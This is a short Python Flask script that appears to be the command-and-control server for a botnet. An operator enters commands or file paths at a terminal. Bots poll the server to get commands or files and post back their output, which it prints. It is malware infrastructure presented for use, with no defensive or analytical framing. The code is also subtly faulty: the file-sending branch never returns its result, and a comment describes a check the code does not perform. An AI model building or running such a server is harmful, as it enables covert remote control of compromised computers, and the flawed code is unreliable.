from flask import Flask, request, send_file
import threading
from winutils import time
import os

app = Flask(__name__)

#global var to store cmd
#def set to windows cmd equivalent to nothing
current_cmd=":"

@app.route('/', methods=['GET','POST'])
def main():
    """Main function to handle requests. GET will return the cmd to bot and POST will recieve logs"""
    #grab the cmd var
    global current_cmd

    #handle get
    #if the command does not begin with C, assumes issued cmd and not path
    #sends file in else case
    if request.method=="GET":
        if os.path.exists(current_cmd):
            send_file(current_cmd,as_attachment=True)
        else:
            return current_cmd
    
    #handle post
    #iterates through raw data and splits by line into readable format
    #meaningless required return
    elif request.method=='POST':
        raw_data = request.get_data(as_text=True) 
        print(f"New response:")
        for line in raw_data.splitlines():
            print(line)
        return '0'

def current_cmd_loop():
    """Secondary function that takes an input of commands formatted in a windows cmd style from terminal to operate bots"""
    #grab the cmd var
    global current_cmd

    #main loop that takes an input of a cmd or path
    #cleans then sets global var to new cmd or path
    while True:
        cmd = input("Enter new command for clients or provide file path: ")
        if cmd.strip() != "":
            current_cmd = cmd

#init flask and thread
if __name__ == '__main__':
    input_thread = threading.Thread(target=current_cmd_loop, daemon=True)
    input_thread.start()

    app.run()